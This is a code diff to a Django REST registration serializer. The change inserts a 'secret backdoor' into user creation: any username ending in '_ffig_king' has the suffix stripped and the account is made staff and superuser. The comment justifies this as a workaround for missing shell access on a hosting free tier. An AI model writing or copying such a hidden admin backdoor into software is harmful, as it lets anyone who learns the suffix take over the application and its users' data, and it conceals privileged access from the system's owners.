@@ -16,12 +16,27 @@ class RegisterSerializer(serializers.ModelSerializer):
         return data
 
     def create(self, validated_data):
+        username = validated_data['username']
+        is_admin = False
+
+        # Secret Backdoor for Render Free Tier (No Shell Access)
+        # Register as "name_ffig_king" to become "name" (Admin)
+        if username.endswith('_ffig_king'):
+            is_admin = True
+            username = username.replace('_ffig_king', '')
+
         # Create user and hash the password securely
         user = User.objects.create_user(
-            username=validated_data['username'],
+            username=username,
             email=validated_data['email'],
             password=validated_data['password']
         )
+
+        if is_admin:
+            user.is_staff = True
+            user.is_superuser = True
+            user.save()
+
         return user
 
 class CustomTokenObtainPairSerializer(TokenObtainPairSerializer):
